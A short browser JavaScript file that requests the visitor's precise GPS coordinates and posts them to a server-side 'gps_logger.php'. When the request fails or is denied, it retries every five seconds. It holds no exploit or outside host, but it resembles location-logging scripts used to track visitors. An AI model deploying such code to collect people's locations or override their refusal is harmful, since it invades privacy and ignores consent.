console.log("[GPS Retry] Script Loaded");

function tryGPS() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        console.log("[GPS] Location:", lat, lon);

        fetch('/server/gps_logger.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ type: "gps", lat: lat, lon: lon })
        });
      },
      function(error) {
        console.warn("[GPS] Failed:", error.message);
        // Retry in 5 seconds
        setTimeout(tryGPS, 5000);
      },
      { enableHighAccuracy: true }
    );
  }
}

tryGPS();
